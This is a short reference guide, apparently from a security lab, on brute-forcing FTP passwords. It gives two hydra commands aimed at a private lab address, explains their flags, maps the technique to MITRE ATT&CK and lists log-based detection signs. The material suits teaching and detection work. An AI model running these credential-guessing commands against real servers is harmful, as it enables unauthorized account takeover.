# FTP Password Brute-Force Attack - Attacker Reference Guide

This folder documents standard FTP brute-forcing commands and theoretical parameters using security testing tools against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of FTP Brute-Forcing
FTP brute-forcing involves systematically attempting login credentials (usernames and passwords) against a running FTP service (e.g. `vsftpd`). Attackers utilize wordlists to identify weak passwords or default accounts. This maps to **MITRE ATT&CK T1110 (Brute Force)**.

## 2. Command Reference

### Brute-Forcing using `hydra`
Hydra allows testing multiple credential combinations concurrently.

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt -t 4 ftp://192.168.56.20
```
* **`-l ftpuser`**: Specifies the target username to test (single login).
* **`-P /usr/share/wordlists/rockyou.txt`**: Specifies the path to the password list.
* **`-t 4`**: Restricts the search execution to 4 tasks/threads.
* **`ftp://192.168.56.20`**: Declares target protocol and IP address.

### Testing username and password lists
If testing list of both usernames and passwords:
```bash
hydra -L /tmp/users.txt -P /tmp/passwords.txt -vV ftp://192.168.56.20
```
* **`-L`**: Specifies path to a text file containing usernames.
* **`-vV`**: Enables verbose mode, showing each login attempt.

## 3. Network Detection Signatures
* High frequency of authentication connection requests to TCP port 21 from a single source host.
* Log entries in `/var/log/vsftpd.log` showing `FAIL LOGIN` in rapid succession.
* Log alerts from local intrusion prevention platforms (like Fail2ban) indicating that an IP address has been banned on the FTP port.
